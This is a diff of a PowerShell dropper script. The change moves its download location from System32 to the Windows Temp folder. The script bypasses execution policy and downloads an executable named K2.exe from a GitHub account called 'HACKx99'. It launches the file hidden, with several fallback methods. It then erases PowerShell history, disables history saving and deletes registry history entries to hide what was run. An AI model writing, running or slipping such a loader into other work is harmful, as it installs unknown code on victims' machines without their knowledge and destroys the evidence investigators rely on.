@@ -1,5 +1,4 @@
-# PowerShell Script to Download, Save to System32, Run EXE Silently, and Clear History
-# WARNING: This script requires Administrator privileges to write to System32.
+# PowerShell Script to Download, Save to Windows Temp, Run EXE Silently, and Clear History
 
 try {
     # Bypass execution policy
@@ -7,24 +6,24 @@ try {
 
     # Use RAW GitHub URL for direct download
     $exeUrl = "https://github.com/HACKx99/WebSite/raw/main/K2.exe"
-     $tempPath = "C:\Windows\Temp\K2.exe"
+    $tempPath = "C:\Windows\Temp\K2.exe"
     $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
     Write-Output "Downloading EXE from GitHub..."
     
-    # Download the EXE to System32
-    Invoke-WebRequest -Uri $exeUrl -OutFile $system32Path -UseBasicParsing
+    # Download the EXE to Windows Temp
+    Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
 
     # Verify download
-    if (Test-Path $system32Path) {
-        Write-Output "EXE saved to System32 successfully"
+    if (Test-Path $tempPath) {
+        Write-Output "EXE saved to Windows Temp successfully"
         
         # Wait to ensure file is completely written
         Start-Sleep -Seconds 3
         
         # Method 1: Start Process with proper parameters
         Write-Output "Attempting to run EXE..."
-        $process = Start-Process -FilePath $system32Path -WindowStyle Hidden -PassThru
+        $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
         
         # Wait and check if process is running
         Start-Sleep -Seconds 2
@@ -34,7 +33,7 @@ try {
             Write-Warning "Process started but exited quickly, trying alternative method..."
             
             # Method 2: Use cmd to start the process
-            cmd.exe /c start "" /MIN "$system32Path"
+            cmd.exe /c start "" /MIN "$tempPath"
             Start-Sleep -Seconds 2
         }
         
@@ -45,7 +44,7 @@ try {
         } else {
             # Method 4: Try using Invoke-Item
             Write-Output "Trying Invoke-Item method..."
-            Invoke-Item -Path $system32Path
+            Invoke-Item -Path $tempPath
             Start-Sleep -Seconds 2
         }
         
@@ -57,7 +56,7 @@ try {
             Write-Warning "! EXE may not be running - check manually in Task Manager"
         }
     } else {
-        throw "Download failed - file not found at $system32Path"
+        throw "Download failed - file not found at $tempPath"
     }
 
     # Forcefully clear PowerShell history
@@ -75,7 +74,7 @@ try {
     # Disable future history saving
     Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
     
-    # Clear registry history (FIXED TYPO: SilentlyContinue)
+    # Clear registry history
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\PowerShell\PSReadLine" -Name "ConsoleHostHistory" -ErrorAction SilentlyContinue
 
     Write-Output "PowerShell history cleared completely"
@@ -83,4 +82,3 @@ try {
 } catch {
     Write-Error "Error: $($_.Exception.Message)"
 }
-
